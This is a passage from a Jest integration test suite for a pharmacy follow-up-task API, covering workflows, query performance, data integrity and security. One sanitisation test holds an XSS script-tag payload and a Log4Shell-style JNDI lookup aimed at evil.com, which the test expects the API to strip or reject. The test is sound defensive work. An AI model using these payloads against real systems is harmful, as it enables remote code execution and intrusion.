        caseNumber: 'DIAG-001',
        chiefComplaint: 'Medication side effects',
        status: 'completed',
        diagnosis: 'Drug-induced side effects',
        recommendations: ['Adjust dosage', 'Monitor closely'],
        createdBy: pharmacistId,
      });
      await diagnosticCase.save();

      // Step 2: Create follow-up from diagnostic
      const followUpResponse = await request(app)
        .post(`/api/engagement-integration/diagnostic/${diagnosticCase._id}/create-followup`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send({
          assignedTo: pharmacistId.toString(),
        });

      expect(followUpResponse.status).toBe(201);
      expect(followUpResponse.body.data.followUpTask.type).toBe('diagnostic_followup');

      // Step 3: Complete follow-up and update diagnostic
      const followUpId = followUpResponse.body.data.followUpTask._id;
      const completeResponse = await request(app)
        .post(`/api/follow-ups/${followUpId}/complete`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send({
          outcome: 'Patient condition improved',
          notes: 'Medication adjustment successful',
          updateDiagnostic: true,
        });

      expect(completeResponse.status).toBe(200);

      // Verify diagnostic case was updated
      const updatedDiagnostic = await DiagnosticCase.findById(diagnosticCase._id);
      expect(updatedDiagnostic!.status).toBe('completed');
    });
  });

  describe('Performance Optimization Testing', () => {
    it('should efficiently handle large dataset queries', async () => {
      // Create large dataset
      const largeDataset = Array.from({ length: 1000 }, (_, index) => ({
        workplaceId,
        patientId,
        title: `Performance Test ${index + 1}`,
        type: 'general',
        priority: index % 3 === 0 ? 'high' : index % 2 === 0 ? 'medium' : 'low',
        status: index % 4 === 0 ? 'completed' : 'pending',
        dueDate: new Date(Date.now() + index * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      }));

      await FollowUpTask.insertMany(largeDataset);

      const startTime = Date.now();

      // Test pagination performance
      const response = await request(app)
        .get('/api/follow-ups?page=1&limit=50&sort=dueDate&order=asc')
        .set('Authorization', `Bearer ${pharmacistToken}`);

      const endTime = Date.now();

      expect(response.status).toBe(200);
      expect(response.body.data.followUps).toHaveLength(50);
      expect(endTime - startTime).toBeLessThan(2000); // Should complete within 2 seconds
    });

    it('should optimize database queries with proper indexing', async () => {
      // Test complex query with multiple filters
      const response = await request(app)
        .get('/api/follow-ups?status=pending&priority=high&assignedTo=' + pharmacistId + '&dueDate[gte]=' + new Date().toISOString())
        .set('Authorization', `Bearer ${pharmacistToken}`);

      expect(response.status).toBe(200);
      // Response should be fast even with complex filters
    });
  });

  describe('Data Consistency and Integrity', () => {
    it('should maintain referential integrity on patient deletion', async () => {
      // Create follow-up
      const followUp = new FollowUpTask({
        workplaceId,
        patientId,
        title: 'Integrity Test',
        type: 'general',
        priority: 'medium',
        status: 'pending',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      });
      await followUp.save();

      // Try to delete patient (should be prevented or cascade properly)
      const deleteResponse = await request(app)
        .delete(`/api/patients/${patientId}`)
        .set('Authorization', `Bearer ${pharmacistToken}`);

      // Either deletion is prevented or follow-ups are properly handled
      if (deleteResponse.status === 200) {
        // If deletion succeeded, follow-ups should be cancelled or deleted
        const remainingFollowUps = await FollowUpTask.find({ patientId });
        expect(remainingFollowUps.every(fu => fu.status === 'cancelled')).toBe(true);
      } else {
        // Deletion should be prevented due to existing follow-ups
        expect(deleteResponse.status).toBe(409);
      }
    });

    it('should handle cascade updates on user role changes', async () => {
      // Create follow-up assigned to pharmacist
      const followUp = new FollowUpTask({
        workplaceId,
        patientId,
        title: 'Role Change Test',
        type: 'general',
        priority: 'medium',
        status: 'pending',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      });
      await followUp.save();

      // Change user role to technician (lower privilege)
      await User.findByIdAndUpdate(pharmacistId, { role: 'pharmacy_technician' });

      // Follow-up should be reassigned or flagged for review
      const response = await request(app)
        .get(`/api/follow-ups/${followUp._id}`)
        .set('Authorization', `Bearer ${pharmacistToken}`);

      // Should either be reassigned or access should be restricted
      expect([200, 403]).toContain(response.status);
    });
  });

  describe('Security and Compliance Testing', () => {
    it('should log all sensitive operations for audit', async () => {
      const followUpData = {
        patientId: patientId.toString(),
        title: 'Audit Test Follow-up',
        type: 'medication_review',
        priority: 'high',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(followUpData);

      expect(response.status).toBe(201);

      // Verify audit log entry was created
      // Note: This would require access to audit log model
      // expect(auditLogEntry).toBeDefined();
    });

    it('should sanitize input to prevent injection attacks', async () => {
      const maliciousData = {
        patientId: patientId.toString(),
        title: '<script>alert("xss")</script>',
        description: '${jndi:ldap://evil.com/a}',
        type: 'general',
        priority: 'medium',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(maliciousData);

      if (response.status === 201) {
        // If creation succeeded, data should be sanitized
        expect(response.body.data.title).not.toContain('<script>');
        expect(response.body.data.description).not.toContain('${jndi:');
      } else {
        // Or request should be rejected
        expect(response.status).toBe(400);
      }
    });

    it('should enforce rate limiting', async () => {
      const requests = Array.from({ length: 100 }, () =>
        request(app)
          .get('/api/follow-ups')
          .set('Authorization', `Bearer ${pharmacistToken}`)
      );

      const results = await Promise.allSettled(requests);
      
      // Some requests should be rate limited
      const rateLimitedRequests = results.filter(result => 
        result.status === 'fulfilled' && result.value.status === 429
      );
      
      expect(rateLimitedRequests.length).toBeGreaterThan(0);
    });
  });
});